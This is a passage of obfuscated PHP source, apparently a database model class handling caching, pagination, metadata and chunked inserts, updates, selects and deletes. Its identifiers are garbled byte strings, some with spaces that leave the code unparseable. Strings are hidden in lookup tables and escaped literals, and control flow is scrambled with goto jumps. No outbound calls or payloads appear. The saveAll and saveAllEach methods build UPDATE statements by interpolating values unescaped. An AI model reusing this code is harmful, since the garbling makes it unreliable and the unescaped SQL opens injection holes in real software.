(!is_array($Cï∑£æìâƒ)) { return; } if (!$this->checkDataAutoHas($_SERVER[—Ω][343])) { return; } foreach ($Cï∑£æìâƒ as &$bàò¢üò∞¢) { $this->dataAfterFilter($bàò¢üò∞¢); } } protected function _afterFind(&$b◊»äÉ∏Ó¢, $fÀÊ∏ë¯ÈÖ) { if (!is_array($b◊»äÉ∏Ó¢)) { return; } if (!$this->checkDataAutoHas($_SERVER[—Ω][343])) { return; } $this->dataAfterFilter($b◊»äÉ∏Ó¢); } public function setAutoIncrement($C§⁄ˆøÒë¿) { $d¶π“™§≤º = array($this->getPk() => $C§⁄ˆøÒë¿); $CÕë◊¡—¬® = $this->data($d¶π“™§≤º)->add(); if ($CÕë◊¡—¬®) { $this->delete($CÕë◊¡—¬®); } } public function getAutoIncrement() { $D¨ÿ¥†©˜® = $this->getTableName(); $e¥®÷—Ñí“ = $this->max($this->getPk()); $AºââºÊÇ∞ = $this->query("\163\x68\157\x77\x20\164\141\142\x6c\x65\x20\163\164\x61\164\165\163\40\167\x68\145\162\145\x20\x4e\x61\x6d\145\x3d\x27{$D¨ÿ¥†©˜®}\47"); $dÙââÛÉÁ¯ = $AºââºÊÇ∞[0][$_SERVER[—Ω][344]]; $a•Æ˜É†ƒ≥ = max($e¥®÷—Ñí“, $dÙââÛÉÁ¯); return $a•Æ˜É†ƒ≥; } protected function _callBefore($Eøﬁ∂›¢Ô’, $Eèˆª´àÔ©) { return $this->cacheCallCheck($Eøﬁ∂›¢Ô’, $Eèˆª´àÔ©, !1); } protected function _callAfter($d£¥ÿö›ëî, $Eë»∏åøÈ) { return $this->cacheCallCheck($d£¥ÿö›ëî, $Eë»∏åøÈ, !0); } protected function cacheFunctionAlias($B≈üÊ¶‘í⁄) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($aÍ—°ºØ‚Æ, $dóÖ∫é–⁄Ô, $D∑© éƒÔ‡ = false) { $f§≥µ§ﬁµæ = $this->cacheFunctionAlias($dóÖ∫é–⁄Ô); if (!$f§≥µ§ﬁµæ) { return; } foreach ($f§≥µ§ﬁµæ as $FÏï÷±ûπî => $E–Ω¥◊¬±≈) { $C‘øè·ò°Ò = $E–Ω¥◊¬±≈[0]; $B£ﬁø«´ë = explode($_SERVER[—Ω][47], $E–Ω¥◊¬±≈[1]); if ($aÍ—°ºØ‚Æ == $FÏï÷±ûπî) { return $this->cacheFunctionGet($FÏï÷±ûπî, $C‘øè·ò°Ò); } if ($D∑© éƒÔ‡ && in_array($aÍ—°ºØ‚Æ, $B£ﬁø«´ë)) { $this->cacheFunctionClear($FÏï÷±ûπî, $C‘øè·ò°Ò); } } } public function cacheFunctionGet($CÜïÖÀüÁŒ, $A¯Ö⁄ﬂ≠„–) { $fÉÏî÷∫â– = $this->cacheKeyMake($CÜïÖÀüÁŒ, $A¯Ö⁄ﬂ≠„–); $f©°Ω•çÿà = Cache::get($fÉÏî÷∫â–); if (!is_array($f©°Ω•çÿà)) { $f©°Ω•çÿà = call_user_func_array(array($this, $CÜïÖÀüÁŒ), array($A¯Ö⁄ﬂ≠„–, !0)); Cache::set($fÉÏî÷∫â–, $f©°Ω•çÿà); } return $f©°Ω•çÿà; } public function cacheFunctionClear($FÇ∆≥í ”‡, $cç€âÊù›Œ) { $DòÈ∂êøúË = $cç€âÊù›Œ; if (!is_array($cç€âÊù›Œ)) { $DòÈ∂êøúË = array($cç€âÊù›Œ); } foreach ($DòÈ∂êøúË as $e¨√áœèﬂÇ) { $b™Ñ¯“ÚŸ› = $this->cacheKeyMake($FÇ∆≥í ”‡, $e¨√áœèﬂÇ); Cache::remove($b™Ñ¯“ÚŸ›); } } private function cacheKeyMake($EùÍ€º◊∆ó, $dÓàı—â¢≤) { $Cåÿ√‹—ë« =& $_SERVER[—Ω]; return get_class($this) . $Cåÿ√‹—ë«[70] . $EùÍ€º◊∆ó . $Cåÿ√‹—ë«[345] . $dÓàı—â¢≤; } protected function selectPage($D†û·ØúóÁ = 200, $BÇÜ≥·¨á÷ = 1) { goto b√Ó¥ûöãπ; Bëî¬ΩÓØÀ: $this->optionsValue($FÌº’íî±í); $D≈π‚ΩÓ≠ı = $this->page($BÇÜ≥·¨á÷, $D†û·ØúóÁ)->select(); $D≈π‚ΩÓ≠ı = is_array($D≈π‚ΩÓ≠ı) ? $D≈π‚ΩÓ≠ı : array(); goto cı∏êêæâÈ; FøÈôÛ≠ìÉ: $d•∞ûÏâÏÊ = 4000; $D†û·ØúóÁ = isset($in[$f‰ŒÎªäùä[346]]) ? $in[$f‰ŒÎªäùä[346]] : $D†û·ØúóÁ; if ($D†û·ØúóÁ === -1) { unset($in[$f‰ŒÎªäùä[346]]); $d•∞ûÏâÏÊ = 100000000; $D†û·ØúóÁ = $d•∞ûÏâÏÊ; } goto cÜä¶òæÂ˜; cı∏êêæâÈ: if ($Cµ‘Ω°ÙÊó == 1) { $bÎ¯˜ã≤ŒÀ = count($D≈π‚ΩÓ≠ı); } $F€ ¨√Ñıå = array($f‰ŒÎªäùä[348] => array($f‰ŒÎªäùä[349] => $bÎ¯˜ã≤ŒÀ, $f‰ŒÎªäùä[346] => $D†û·ØúóÁ, $f‰ŒÎªäùä[337] => $BÇÜ≥·¨á÷, $f‰ŒÎªäùä[350] => $Cµ‘Ω°ÙÊó), $f‰ŒÎªäùä[351] => $D≈π‚ΩÓ≠ı ? $D≈π‚ΩÓ≠ı : array()); return $F€ ¨√Ñıå; goto c≈‚Ë¢‹◊î; AñÌÓ»ø∏: $bÎ¯˜ã≤ŒÀ = intval($this->count()); $D†û·ØúóÁ = intval($D†û·ØúóÁ); $D†û·ØúóÁ = $D†û·ØúóÁ <= 5 ? 5 : ($D†û·ØúóÁ >= $d•∞ûÏâÏÊ ? $d•∞ûÏâÏÊ : $D†û·ØúóÁ); goto bØÆ¡—åŸÒ; cÜä¶òæÂ˜: $A¿Ø¢⁄óÖê = $FÌº’íî±í; $A¿Ø¢⁄óÖê[$f‰ŒÎªäùä[347]] = array(); $this->optionsValue($A¿Ø¢⁄óÖê); goto AñÌÓ»ø∏; b√Ó¥ûöãπ: $f‰ŒÎªäùä =& $_SERVER[—Ω]; global $in; $FÌº’íî±í = $this->optionsValue(); goto FøÈôÛ≠ìÉ; bØÆ¡—åŸÒ: $Cµ‘Ω°ÙÊó = ceil($bÎ¯˜ã≤ŒÀ / $D†û·ØúóÁ); $BÇÜ≥·¨á÷ = intval(isset($in[$f‰ŒÎªäùä[337]]) ? $in[$f‰ŒÎªäùä[337]] : $BÇÜ≥·¨á÷); $BÇÜ≥·¨á÷ = $BÇÜ≥·¨á÷ <= 1 ? 1 : ($BÇÜ≥·¨á÷ >= $Cµ‘Ω°ÙÊó ? $Cµ‘Ω°ÙÊó : $BÇÜ≥·¨á÷); goto Bëî¬ΩÓØÀ; c≈‚Ë¢‹◊î: } protected function checkLength($cÛÜÉØˆ‚·, $fééëëè˘√ = 0, $dˆŒÚã∫–ù = '') { $E∑‘§π∑⁄Î =& $_SERVER[—Ω]; $fééëëè˘√ = $fééëëè˘√ ? $fééëëè˘√ : 65536; if (!$cÛÜÉØˆ‚· || strlen($cÛÜÉØˆ‚·) < $fééëëè˘√) { return; } $dˆŒÚã∫–ù = $dˆŒÚã∫–ù ? $dˆŒÚã∫–ù . $E∑‘§π∑⁄Î[67] : $E∑‘§π∑⁄Î[33]; show_json($dˆŒÚã∫–ù . LNG($E∑‘§π∑⁄Î[352]) . "\50{$fééëëè˘√}\51", !1); } protected function metaSet($FèÍÆÒä“π, $cææ≥ç‡∂Ñ = null, $B™Ò∂°ﬂ…é = null) { goto Fì≤Ñ∞—ÀØ; fè±Ñù∫£Õ: if (is_null($cææ≥ç‡∂Ñ)) { return $dæÖ‹£©áé->where(array($F–’Öƒæ˜± => $FèÍÆÒä“π))->delete(); } if (is_null($B™Ò∂°ﬂ…é)) { return $dæÖ‹£©áé->where($cÒ≈àÂËÀ„)->delete(); } $b˜èè·Ù–› = is_array($cææ≥ç‡∂Ñ) ? $cææ≥ç‡∂Ñ : array(); goto Aç‹¥ã◊Ç‘; aëÁµ”Ò∆Ö: $CÁΩÊﬂëÌ¬ = $this->tableMeta[$f∑¶•Àç“¿[354]]; $dæÖ‹£©áé = Model($CÁΩÊﬂëÌ¬); $cÒ≈àÂËÀ„ = array($F–’Öƒæ˜± => $FèÍÆÒä“π, $f∑¶•Àç“¿[355] => $cææ≥ç‡∂Ñ); goto fè±Ñù∫£Õ; Fì≤Ñ∞—ÀØ: $f∑¶•Àç“¿ =& $_SERVER[—Ω]; if (!$this->tableMeta) { return !1; } $F–’Öƒæ˜± = $this->tableMeta[$f∑¶•Àç“¿[353]]; goto aëÁµ”Ò∆Ö; Aç‹¥ã◊Ç‘: if (is_string($cææ≥ç‡∂Ñ)) { $b˜èè·Ù–›[$cææ≥ç‡∂Ñ] = $B™Ò∂°ﬂ…é; } $E‹À”À∏ìﬂ = array(); foreach ($b˜èè·Ù–› as $Aæ™ÁÚü¯° => $cè•É–‹ä…) { $this->checkLength($cè•É–‹ä…, !1, $CÁΩÊﬂëÌ¬ . $f∑¶•Àç“¿[4] . $Aæ™ÁÚü¯°); $E‹À”À∏ìﬂ[] = array($F–’Öƒæ˜± => $FèÍÆÒä“π, $f∑¶•Àç“¿[89] => $Aæ™ÁÚü¯°, $f∑¶•Àç“¿[356] => $cè•É–‹ä…); } goto d √Ÿ•¢±Ö; d √Ÿ•¢±Ö: $dæÖ‹£©áé->where(array($F–’Öƒæ˜± => $FèÍÆÒä“π))->addAll($E‹À”À∏ìﬂ, array(), !0); return !0; goto fı£«ˆ›‡‰; fı£«ˆ›‡‰: } public function metaGet($döãò÷ïåÈ) { goto bë∏Ûûø›é; eñâãú–¶¡: $BÜà∂Ú›§¿ = array_to_keyvalue($BÜà∂Ú›§¿, $B…íÕÙ°°≤[89], $B…íÕÙ°°≤[356]); return $BÜà∂Ú›§¿; goto Dƒ◊††òéƒ; E›âÆç√®‹: $A¬çñóÆá€ = Model($this->tableMeta[$B…íÕÙ°°≤[354]]); $fÔ÷⁄®Ú°ê = array($Eâÿ∫ŸøÀÃ => $döãò÷ïåÈ); $BÜà∂Ú›§¿ = $A¬çñóÆá€->field($B…íÕÙ°°≤[357])->where($fÔ÷⁄®Ú°ê)->select(); goto eñâãú–¶¡; bë∏Ûûø›é: $B…íÕÙ°°≤ =& $_SERVER[—Ω]; if (!$this->tableMeta) { return array(); } $Eâÿ∫ŸøÀÃ = $this->tableMeta[$B…íÕÙ°°≤[353]]; goto E›âÆç√®‹; Dƒ◊††òéƒ: } private function checkDataAutoHas($b÷¨—◊ºõÆ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $e°Ñ«·∏øœ) { if (in_array($b÷¨—◊ºõÆ, explode($_SERVER[—Ω][47], $e°Ñ«·∏øœ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$FÚ»Ö•âî√, $aë∫ú–ÓûŒ) { $cÙŸ–î∂√π =& $_SERVER[—Ω]; foreach ($this->dataAuto as $D™ø‚ËóÑá) { $bÖ¨≤€Êÿõ = $D™ø‚ËóÑá[0]; if (!in_array($aë∫ú–ÓûŒ, explode($cÙŸ–î∂√π[47], $D™ø‚ËóÑá[2]))) { continue; } switch (trim($D™ø‚ËóÑá[3])) { case $cÙŸ–î∂√π[306]: case $cÙŸ–î∂√π[307]: $aŸÙøÎ§ä⁄ = $D™ø‚ËóÑá[1]; $dÏ†îÉ‡ôÇ = isset($D™ø‚ËóÑá[4]) ? (array) $D™ø‚ËóÑá[4] : array(); if ($aŸÙøÎ§ä⁄ == $cÙŸ–î∂√π[187] && array_key_exists($bÖ¨≤€Êÿõ, $FÚ»Ö•âî√)) { if (!$FÚ»Ö•âî√[$bÖ¨≤€Êÿõ]) { unset($FÚ»Ö•âî√[$bÖ¨≤€Êÿõ]); } break; } if (isset($FÚ»Ö•âî√[$bÖ¨≤€Êÿõ])) { array_unshift($dÏ†îÉ‡ôÇ, $FÚ»Ö•âî√[$bÖ¨≤€Êÿõ]); } if ($cÙŸ–î∂√π[306] == $D™ø‚ËóÑá[3]) { $FÚ»Ö•âî√[$bÖ¨≤€Êÿõ] = call_user_func_array($aŸÙøÎ§ä⁄, $dÏ†îÉ‡ôÇ); } else { $FÚ»Ö•âî√[$bÖ¨≤€Êÿõ] = call_user_func_array(array(&$this, $aŸÙøÎ§ä⁄), $dÏ†îÉ‡ôÇ); } break; case $cÙŸ–î∂√π[258]: $FÚ»Ö•âî√[$bÖ¨≤€Êÿõ] = $FÚ»Ö•âî√[$D™ø‚ËóÑá[1]]; break; case $cÙŸ–î∂√π[279]: if (isset($FÚ»Ö•âî√[$bÖ¨≤€Êÿõ]) && !is_string($FÚ»Ö•âî√[$bÖ¨≤€Êÿõ])) { $FÚ»Ö•âî√[$bÖ¨≤€Êÿõ] = json_encode_force($FÚ»Ö•âî√[$bÖ¨≤€Êÿõ]); } break; case $cÙŸ–î∂√π[308]: if ($FÚ»Ö•âî√[$bÖ¨≤€Êÿõ] === $cÙŸ–î∂√π[33]) { unset($FÚ»Ö•âî√[$bÖ¨≤€Êÿõ]); } break; case $cÙŸ–î∂√π[309]: $FÚ»Ö•âî√[$bÖ¨≤€Êÿõ] = $D™ø‚ËóÑá[1]; default: break; } } if ($aë∫ú–ÓûŒ == $cÙŸ–î∂√π[341]) { $fñ…É´»∆ = strtolower($this->db->getDbType()); if (strpos($fñ…É´»∆, $cÙŸ–î∂√π[9]) !== 0) { return; } $d¿¨Ü˜€©« = $this->field(!0)->fields; $AÉ††î∫ƒ◊ = $d¿¨Ü˜€©«[$cÙŸ–î∂√π[237]]; if (isset($d¿¨Ü˜€©«[$cÙŸ–î∂√π[236]])) { unset($AÉ††î∫ƒ◊[$d¿¨Ü˜€©«[$cÙŸ–î∂√π[236]]]); } foreach ($AÉ††î∫ƒ◊ as $cŸ—çôıÉÎ => $aë∫ú–ÓûŒ) { if (!isset($FÚ»Ö•âî√[$cŸ—çôıÉÎ])) { $FÚ»Ö•âî√[$cŸ—çôıÉÎ] = $cÙŸ–î∂√π[33]; } } } } private function dataAfterFilter(&$B˜íåÆÑ·∫) { $E‹ä–ïœõü =& $_SERVER[—Ω]; foreach ($this->dataAuto as $a√èä◊å±) { $D∫úâ˘á∆ä = $a√èä◊å±[0]; if (!in_array($E‹ä–ïœõü[343], explode($E‹ä–ïœõü[47], $a√èä◊å±[2]))) { continue; } if (!isset($B˜íåÆÑ·∫[$D∫úâ˘á∆ä])) { continue; } switch (trim($a√èä◊å±[3])) { case $E‹ä–ïœõü[306]: case $E‹ä–ïœõü[307]: $fÊˆ§˘èÙΩ = isset($a√èä◊å±[4]) ? (array) $a√èä◊å±[4] : array(); array_unshift($fÊˆ§˘èÙΩ, $B˜íåÆÑ·∫[$D∫úâ˘á∆ä]); if ($E‹ä–ïœõü[306] == $a√èä◊å±[3]) { $B˜íåÆÑ·∫[$D∫úâ˘á∆ä] = call_user_func_array($a√èä◊å±[1], $fÊˆ§˘èÙΩ); } else { $B˜íåÆÑ·∫[$D∫úâ˘á∆ä] = call_user_func_array(array(&$this, $a√èä◊å±[1]), $fÊˆ§˘èÙΩ); } break; case $E‹ä–ïœõü[258]: $B˜íåÆÑ·∫[$D∫úâ˘á∆ä] = $B˜íåÆÑ·∫[$a√èä◊å±[1]]; break; case $E‹ä–ïœõü[279]: $cºÉ•êÈá∞ = $B˜íåÆÑ·∫[$D∫úâ˘á∆ä]; $B˜íåÆÑ·∫[$D∫úâ˘á∆ä] = json_decode($cºÉ•êÈá∞, !0); if (is_null($B˜íåÆÑ·∫[$D∫úâ˘á∆ä])) { $B˜íåÆÑ·∫[$D∫úâ˘á∆ä] = $cºÉ•êÈá∞; } break; case $E‹ä–ïœõü[308]: if ($B˜íåÆÑ·∫[$D∫úâ˘á∆ä] === $E‹ä–ïœõü[33]) { unset($B˜íåÆÑ·∫[$D∫úâ˘á∆ä]); } break; case $E‹ä–ïœõü[309]: $B˜íåÆÑ·∫[$D∫úâ˘á∆ä] = $a√èä◊å±[1]; default: break; } } } public function saveAll($aÎÍñÒø§ï) { goto Bçßõúøê·; Bçßõúøê·: $cè∞åÊÊê¯ =& $_SERVER[—Ω]; $EÑ‰£±≥Éã = $this->tablePrefix . $this->tableName; $AƒöíÑ™Û≥ = self::SQL_WHERE_IN_CHUNK; goto FüÔäŸ‘ôË; FüÔäŸ‘ôË: $aÎÍñÒø§ï = is_array($aÎÍñÒø§ï) ? $aÎÍñÒø§ï : array(); $b⁄ü≠ã≠…â = $cè∞åÊÊê¯[358]; $dÜ∆ê‰öâí = 0; goto e¥£â≈òû; e¥£â≈òû: $aÌß∑√⁄ûÆ = array(); $aëÂÈ·∫µÍ = count($aÎÍñÒø§ï); for ($b‚êà„ç∏ô = 0; $b‚êà„ç∏ô < $aëÂÈ·∫µÍ; $b‚êà„ç∏ô++) { $Dà–Î√Ôµ’ = $aÎÍñÒø§ï[$b‚êà„ç∏ô]; if (!is_array($Dà–Î√Ôµ’) || count($Dà–Î√Ôµ’) != 4) { continue; } $Dçû˘—Ÿ°“ = "\x55\x50\x44\101\124\105\x20{$EÑ‰£±≥Éã}\x20\x53\105\x54\40{$Dà–Î√Ôµ’[2]}\40\75\40\103\x41\x53\x45\40{$Dà–Î√Ôµ’[0]}\40\xa"; if ($dÜ∆ê‰öâí == 0) { $b⁄ü≠ã≠…â = $Dçû˘—Ÿ°“; } $aÌß∑√⁄ûÆ[] = $cè∞åÊÊê¯[113] . $Dà–Î√Ôµ’[1] . $cè∞åÊÊê¯[113]; $dÜ∆ê‰öâí++; $b⁄ü≠ã≠…â .= "\40\127\110\105\116\40\x27{$Dà–Î√Ôµ’[1]}\47\40\124\110\x45\x4e\x20\x27{$Dà–Î√Ôµ’[3]}\47\x20\12"; if ($dÜ∆ê‰öâí == $AƒöíÑ™Û≥ || $b‚êà„ç∏ô == $aëÂÈ·∫µÍ - 1) { goto aéäˆ±êÙÆ; a•¡ î–™ä: $aÌß∑√⁄ûÆ = array(); goto DˆÜ“ÑÑÒ∂; aéäˆ±êÙÆ: $E“Ã¥ÉÚ†Œ = implode($cè∞åÊÊê¯[47], $aÌß∑√⁄ûÆ); $b⁄ü≠ã≠…â .= "\40\105\116\104\x20\40\127\x48\x45\x52\105\40{$Dà–Î√Ôµ’[0]}\x20\x49\x4e\x20\50{$E“Ã¥ÉÚ†Œ}\x29\40"; $this->execute($b⁄ü≠ã≠…â); goto Fƒ÷—êâáÀ; Fƒ÷—êâáÀ: $dÜ∆ê‰öâí = 0; $b⁄ü≠ã≠…â = $Dçû˘—Ÿ°“; $this->chunkEventCheck(count($aÌß∑√⁄ûÆ)); goto a•¡ î–™ä; DˆÜ“ÑÑÒ∂: } } goto FÈê‡êò…¶; FÈê‡êò…¶: $this->chunkEventSet(); goto c•ÜÖ¶©êø; c•ÜÖ¶©êø: } public function saveAllEach($d≠¢ÖÌ®ßı) { $Eˆ·“È˜“À =& $_SERVER[—Ω]; $D¢Ã∫˜ÀöÉ = $this->tablePrefix . $this->tableName; foreach ($d≠¢ÖÌ®ßı as $C„äÓµ ¬œ) { if (!is_array($C„äÓµ ¬œ) || count($C„äÓµ ¬œ) != 4) { continue; } $Eå∫¡Õ¶é€ = $C„äÓµ ¬œ[0] . $Eˆ·“È˜“À[359] . $C„äÓµ ¬œ[1] . $Eˆ·“È˜“À[113]; $aÏ∂ à√∏Û = $C„äÓµ ¬œ[2] . $Eˆ·“È˜“À[359] . $C„äÓµ ¬œ[3] . $Eˆ·“È˜“À[113]; $A©ØŒ™í†à = "\x75\x70\144\x61\x74\x65\40{$D¢Ã∫˜ÀöÉ}\x20\163\x65\x74\40{$aÏ∂ à√∏Û}\40\167\x68\x65\x72\x65\x20{$Eå∫¡Õ¶é€}\73"; $this->execute($A©ØŒ™í†à); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($A°ﬁå©∫Í’ = false, $AÉÁÍøå¿• = false) { $this->_chunkEvent = $A°ﬁå©∫Í’; $this->_chunkEventParam = $AÉÁÍøå¿•; } private function chunkEventCheck($fÙ»ΩﬂàÓ) { if (!$this->_chunkEvent) { return; } $D–Œë‚“ˆÌ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $D–Œë‚“ˆÌ[$_SERVER[—Ω][360]] = $fÙ»ΩﬂàÓ; Hook::trigger($this->_chunkEvent, $D–Œë‚“ˆÌ); } public function addAll($d√˘ºñÑ…Ú, $E˘°Ôú—Öã = array(), $C»ˆ‚Í‰Îò = false) { goto aÊ¥ëÛÁêÁ; E´ßÌ∏™ã‚: if (method_exists($this->db, $C—„∑¨¢›ê[257])) { for ($fëﬂÃ•Ó©— = 0; $fëﬂÃ•Ó©— < count($d√˘ºñÑ…Ú); $fëﬂÃ•Ó©— += $d¬≥±£Ô≈Ç) { $D ≈õ≤–Êú = array_slice($d√˘ºñÑ…Ú, $fëﬂÃ•Ó©—, $d¬≥±£Ô≈Ç); if (!is_array($D ≈õ≤–Êú) || count($D ≈õ≤–Êú) == 0) { break; } $b–‚π‘¿¢Ü = $this->db->insertAll($D ≈õ≤–Êú, $E˘°Ôú—Öã, $C»ˆ‚Í‰Îò); $this->chunkEventCheck(count($D ≈õ≤–Êú)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($d√˘ºñÑ…Ú as $CàìØ«∫ÍË => $e∑¨îëÑ◊π) { $b–‚π‘¿¢Ü = $this->db->insert($e∑¨îëÑ◊π, $E˘°Ôú—Öã, $C»ˆ‚Í‰Îò); } $this->commit(); } if (!1 !== $b–‚π‘¿¢Ü) { $e—«ÑÉ¨èì = $this->getLastInsID(); if ($e—«ÑÉ¨èì) { return $e—«ÑÉ¨èì; } } return $b–‚π‘¿¢Ü; goto d±ÜÉ¨ÌëÊ; aÊ¥ëÛÁêÁ: $C—„∑¨¢›ê =& $_SERVER[—Ω]; ignore_timeout(); $d¬≥±£Ô≈Ç = self::SQL_WHERE_IN_CHUNK; goto Aâ√®ŒáÎÀ; Aâ√®ŒáÎÀ: if (empty($d√˘ºñÑ…Ú)) { $this->error = think_lang($C—„∑¨¢›ê[256]); return !1; } $E˘°Ôú—Öã = $this->_parseOptions($E˘°Ôú—Öã); foreach ($d√˘ºñÑ…Ú as $CàìØ«∫ÍË => $e∑¨îëÑ◊π) { $d√˘ºñÑ…Ú[$CàìØ«∫ÍË] = $this->_facade($e∑¨îëÑ◊π); $this->_beforeInsert($d√˘ºñÑ…Ú[$CàìØ«∫ÍË], $E˘°Ôú—Öã); } goto E´ßÌ∏™ã‚; d±ÜÉ¨ÌëÊ: } public function save($bÊë¨›√ÛÜ = '', $fëÖ◊‘æŒè = array()) { goto dêáëŸÓ≈∞; DÕÑÎ’µ–⁄: $aÚÛ˘êÖ˜ú = $this->findWhereField($E≠ﬂÔü¿≈õ); if (!$aÚÛ˘êÖ˜ú) { return parent::save($bÊë¨›√ÛÜ, $fëÖ◊‘æŒè); } $Bä“≠åŒ∂à = 0; goto Aõå∏âáÉ—; Aõå∏âáÉ—: $fÛäÒÂ≈„á = $E≠ﬂÔü¿≈õ[$AÂÜŸßÚ¨ú[260]][$aÚÛ˘êÖ˜ú][1]; $fÛäÒÂ≈„á = is_array($fÛäÒÂ≈„á) ? $fÛäÒÂ≈„á : array(); $EÜΩˆ∑„ÿ⁄ = count($fÛäÒÂ≈„á); goto Aπ∂êÆﬂ∆’; Aπ∂êÆﬂ∆’: for ($FÉâÎô¡ßŸ = 0; $FÉâÎô¡ßŸ < $EÜΩˆ∑„ÿ⁄; $FÉâÎô¡ßŸ += $D·ã⁄üñïµ) { $fÍœå§¶†¯ = array_slice($fÛäÒÂ≈„á, $FÉâÎô¡ßŸ, $D·ã⁄üñïµ); if (!is_array($fÍœå§¶†¯) || count($fÍœå§¶†¯) == 0) { break; } $E≠ﬂÔü¿≈õ[$AÂÜŸßÚ¨ú[260]][$aÚÛ˘êÖ˜ú][1] = $fÍœå§¶†¯; $this->optionsValue($E≠ﬂÔü¿≈õ); $Bä“≠åŒ∂à += parent::save($bÊë¨›√ÛÜ, $fëÖ◊‘æŒè); $this->chunkEventCheck(count($fÍœå§¶†¯)); } $this->chunkEventSet(); return $Bä“≠åŒ∂à; goto däÌ¡ëÌÀ; dêáëŸÓ≈∞: $AÂÜŸßÚ¨ú =& $_SERVER[—Ω]; $D·ã⁄üñïµ = self::SQL_WHERE_IN_CHUNK; $E≠ﬂÔü¿≈õ = $this->optionsValue(); goto DÕÑÎ’µ–⁄; däÌ¡ëÌÀ: } public function add($B¨ê™ß«ƒÍ = '', $aºΩùîèÛñ = array(), $e‘∞”Î•‚Ö = false) { if ($this->addTaskStatus && is_array($B¨ê™ß«ƒÍ)) { $this->addTaskData[] = $B¨ê™ß«ƒÍ; return; } return parent::add($B¨ê™ß«ƒÍ, $aºΩùîèÛñ, $e‘∞”Î•‚Ö); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Eê®£û›Óñ = array()) { goto E§÷¯∏“ß; A‘ûÏµíΩ: $AÈíÖë§öÁ = is_array($AÈíÖë§öÁ) ? $AÈíÖë§öÁ : array(); $eÀ∂êŒû€ = null; for ($b€…ÓäŸÁá = 0; $b€…ÓäŸÁá < count($AÈíÖë§öÁ); $b€…ÓäŸÁá += $fÎ◊ıåö¿û) { $fÌ⁄«œê«É = array_slice($AÈíÖë§öÁ, $b€…ÓäŸÁá, $fÎ◊ıåö¿û); if (!is_array($fÌ⁄«œê«É) || count($fÌ⁄«œê«É) == 0) { break; } $bãû‘∂∑∫Ù[$a˜µòÉö â[260]][$D’øí∆éíó][1] = $fÌ⁄«œê«É; $this->optionsValue($bãû‘∂∑∫Ù); $CÖÜ≈©•πï = parent::select($Eê®£û›Óñ); if (!$CÖÜ≈©•πï) { continue; } if (is_null($eÀ∂êŒû€)) { $eÀ∂êŒû€ = array(); } $eÀ∂êŒû€ = array_merge($eÀ∂êŒû€, $CÖÜ≈©•πï); } goto DŸ»◊≠†’¯; D¶úïµëÑµ: $D’øí∆éíó = $this->findWhereField($bãû‘∂∑∫Ù); if (!$D’øí∆éíó || isset($bãû‘∂∑∫Ù[$a˜µòÉö â[277]]) || isset($bãû‘∂∑∫Ù[$a˜µòÉö â[337]])) { return parent::select($Eê®£û›Óñ); } $AÈíÖë§öÁ = $bãû‘∂∑∫Ù[$a˜µòÉö â[260]][$D’øí∆éíó][1]; goto A‘ûÏµíΩ; E§÷¯∏“ß: $a˜µòÉö â =& $_SERVER[—Ω]; $fÎ◊ıåö¿û = self::SQL_WHERE_IN_CHUNK; $bãû‘∂∑∫Ù = $this->optionsValue(); goto D¶úïµëÑµ; DŸ»◊≠†’¯: return $eÀ∂êŒû€; goto D˜Ú—∏≥ÀÃ; D˜Ú—∏≥ÀÃ: } public function delete($bºÇ∏‘ÎæÙ = array()) { goto cÇÃÎÚ†¬è; cÇÃÎÚ†¬è: $dÜí˘ÏßñÜ =& $_SERVER[—Ω]; $eêÂ©¡ΩÀ≥ = self::SQL_WHERE_IN_CHUNK; $A◊Œ£ê ¢Ù = $this->optionsValue(); goto d∑ÑªÆï≠ä; a¨‰≈≈Ô‘ì: $DıÑúÜﬂ®… = $A◊Œ£ê ¢Ù[$dÜí˘ÏßñÜ[260]][$C‡Á˜°‘î˘][1]; $DıÑúÜﬂ®… = is_array($DıÑúÜﬂ®…) ? $DıÑúÜﬂ®… : array(); for ($d¬¯ñ∂ÇË∏ = 0; $d¬¯ñ∂ÇË∏ < count($DıÑúÜﬂ®…); $d¬¯ñ∂ÇË∏ += $eêÂ©¡ΩÀ≥) { $bíÚò†€ƒ» = array_slice($DıÑúÜﬂ®…, $d¬¯ñ∂ÇË∏, $eêÂ©¡ΩÀ≥); if (!is_array($bíÚò†€ƒ») || count($bíÚò†€ƒ») == 0) { break; } $A◊Œ£ê ¢Ù[$dÜí˘ÏßñÜ[260]][$C‡Á˜°‘î˘][1] = $bíÚò†€ƒ»; $this->optionsValue($A◊Œ£ê ¢Ù); $b˜∫î∞≤ã≥ += parent::delete($bºÇ∏‘ÎæÙ); } goto Eê·…í≥ä∏; Eê·…í≥ä∏: return $b˜∫î∞≤ã≥; goto Dº≈Ìá÷´ç; d∑ÑªÆï≠ä: $C‡Á˜°‘î˘ = $this->findWhereField($A◊Œ£ê ¢Ù); if (!$C‡Á˜°‘î˘) { return parent::delete($bºÇ∏‘ÎæÙ); } $b˜∫î∞≤ã≥ = 0; goto a¨‰≈≈Ô‘ì; Dº≈Ìá÷´ç: } private function findWhereField($F ïÙÑà‡–) { $AÔçéèíò¥ =& $_SERVER[—Ω]; $EÆÎ–·Àä≤ = self::SQL_WHERE_IN_CHUNK; if (!is_array($F ïÙÑà‡–) || !is_array($F ïÙÑà‡–[$AÔçéèíò¥[260]])) { return !1; } foreach ($F ïÙÑà‡–[$AÔçéèíò¥[260]] as $bŒÎúüÖ∞õ => $Bô§ááä«è) { if (is_array($Bô§ááä«è) && isset($Bô§ááä«è[0]) && is_string($Bô§ááä«è[0]) && strtolower($Bô§ááä«è[0]) == $AÔçéèíò¥[7] && is_array($Bô§ááä«è[1]) && count($Bô§ááä«è[1]) > $EÆÎ–·Àä≤) { ignore_timeout(); return $bŒÎúüÖ∞õ; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\163\x74\x65\155\x4f\x70\164\151\x6f\x6e"; public $field = array(); public function listData($døÀ™ ò¨≈ = false, $câÜèàã Ã = 